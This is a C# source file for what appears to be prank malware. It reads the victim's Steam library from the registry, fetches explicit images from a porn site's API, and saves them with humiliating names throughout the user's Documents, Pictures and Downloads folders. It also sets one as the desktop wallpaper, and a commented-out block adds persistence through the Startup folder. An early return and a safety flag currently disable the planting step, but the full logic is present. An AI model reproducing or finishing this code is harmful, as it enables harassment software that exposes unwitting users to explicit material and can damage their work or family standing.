using System.Net;
using System.Diagnostics;
using System.Xml;
using System.Runtime.InteropServices;
using FiksHomeWork;
using Microsoft.Win32;

public class OwOinator
{
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

    const int SPI_SETDESKWALLPAPER = 20;
    const int SPIF_UPDATEINIFILE = 0x01;
    const int SPIF_SENDWININICHANGE = 0x02;
    private static readonly string[] file_names = new string[]
    {
        "lusty_argonian_", "sussy_were_wolf_", "LOONA_AWOOGA_", "homework_", "my_secret_nft_",
        "mom_dont_open_", "kobolds_fucking_kobolds_", "femboy_hooters_", "terraria_zoologist_lewd_",
        "gay_fnaf_porn_", "lego_jesus_", "owo_rawr_x3_", "big_boobas_"
    };

    private static readonly Dictionary<string, string> tag_map = new() {
        {"skyrim_special_edition", "skyrim"},
        {"scp_containment_breach_multiplayer", "scp"},
        {"scp_secret_laboratory", "scp"},
        {"space_station_14_playtest", "ss13"}
    };

    private static readonly string[] postfix_white_list = new string[]
    {
        "png", "jpeg", "jpg", "webp"
    };

    private static readonly Random random = new();

    private static readonly string defaultTags = "anthro ";

    private static readonly List<string> tagSets = new();

    private static readonly List<string> theLambSauce = new();

    public static void Init()
    {
        var userPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        //C:\Users\Purpl\AppData\Roaming\Microsoft\Windows\Start Menu\Programs

        // try {
        //     File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, userPath + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\e.exe");
        // } catch (Exception) {}

        Analysis();
        FetchTheLambSauce();
        return;

        var dirs = new List<string>();
        var depth = 0;

        if (!Program.Safety)
        {
            dirs.AddRange(FetchTheHomeWorkFolders(userPath + @"\Documents\", ref depth));
            dirs.AddRange(FetchTheHomeWorkFolders(userPath + @"\Pictures\", ref depth));
            dirs.AddRange(FetchTheHomeWorkFolders(userPath + @"\Downloads\", ref depth));
        }
        else
        {
            dirs = FetchTheHomeWorkFolders(@"C:\Users\Purpl\Desktop\FiksHomeWork\testinggrounds\", ref depth);
        }

        for (int i = 0; i < dirs.Count; i++)
        {
            if (theLambSauce.Count == 0)
                break;
            for (int j = 0; j < theLambSauce.Count; j++) 
            {
                GetImages(theLambSauce[Random.Shared.Next(0, theLambSauce.Count)], dirs[i] + "\\", ref j);
            }
        }

        if (!Program.Safety)
            OwOifyWallPaper(theLambSauce[Random.Shared.Next(0, theLambSauce.Count)]);
    }

    private static void Analysis() {
        string registry_key = @"SOFTWARE\Valve\Steam\Apps";
        using(RegistryKey? key = Registry.CurrentUser.OpenSubKey(registry_key))
        {
            if (key == null)
                return;
            foreach(string subkey_name in key.GetSubKeyNames())
            {
                using(RegistryKey? subkey = key.OpenSubKey(subkey_name))
                {
                    if (subkey == null || subkey.GetValue("Name") == null)
                        continue;
                    string tag = ((string)subkey.GetValue("Name")).Replace(" ", "_").ToLower();
                    tagSets.Add((Program.Safety ? "pussy " : "") + defaultTags + (tag_map.ContainsKey(tag) ? tag_map[tag] : tag));
                }
            }
        }
    }

    private static void FetchTheLambSauce()
    {
        using (WebClient client = new())
        {
            foreach (string tag in tagSets)
            {
                string result = client.DownloadString("https://api.rule34.xxx/index.php?page=dapi&s=post&q=index&tags=" + tag);

                XmlDocument xml = new();
                xml.LoadXml(result);

                XmlNodeList? res = xml.SelectNodes("posts/post");

                if (res == null)
                    return;

                try
                {
                    foreach (XmlNode node in res)
                    {
                        string url = node.Attributes["file_url"].Value;

                        if (postfix_white_list.Contains(url.Split(".").Last()))
                            theLambSauce.Add(node.Attributes["file_url"].Value);
                    }
                }
                catch (Exception) {}
            }
        }
    }

    public static string GetLambSauce() {
        return Util.GetRandomString(theLambSauce.ToArray());
    }

    private static List<string> FetchTheHomeWorkFolders(string pth, ref int depth)
    {
        var dirs = new List<string>();

        dirs.AddRange(Directory.GetDirectories(pth));

        var subdirs = new List<string>();
        foreach (string dir in dirs)
        {
            if (depth >= 20)
                break;
            if (dir.Split("\\").Last().StartsWith("."))
                continue;
            subdirs.AddRange(FetchTheHomeWorkFolders(dir, ref depth));
        }

        dirs.AddRange(subdirs);
        
        depth++;
        return dirs;
    }

    private static string GetRandomDirectory(string pth, ref int depth) {
        if (depth++ >= 100)
            return pth;
        try {
            string[] dirs = Directory.GetDirectories(pth);
            string? dir = (string?)dirs.GetValue(random.Next(0, dirs.Length));

            if (dir == null)
                return GetRandomDirectory(pth, ref depth);
            
            string current = dir.Split("\\").Last();

            if (current.StartsWith(".") || current.StartsWith("$"))
                return GetRandomDirectory(pth, ref depth);

            return GetRandomDirectory(dir, ref depth);
        } catch (Exception) { return pth; }
    }

    private static void GetImages(string url, string pth, ref int i)
    {
        try {
            var name = file_names[Random.Shared.Next(0, file_names.Length)];
            var filePath = string.Empty;

            using (WebClient client = new())
            {
                var postfix = url.Split(".").Last();
                Console.Write(postfix);

                if (!postfix_white_list.Contains(postfix))
                    return;
                
                filePath = pth + name + i.ToString() + "." + postfix;

                if (filePath != string.Empty)
                {
                    client.DownloadFile(url, filePath);
                }
            }
            i++;
        }
        catch {}
    }

    private static void OwOifyWallPaper(string url)
    {
        var postfix = string.Empty;
        using (WebClient client = new())
        {
            postfix = "." + url.Split(".").Last();

            client.DownloadFile(url, Path.GetTempPath() + "bg" + postfix);
        }

        var _ = SystemParametersInfo(SPI_SETDESKWALLPAPER,
            0,
            Path.GetTempPath() + "bg" + postfix,
            SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
    }
}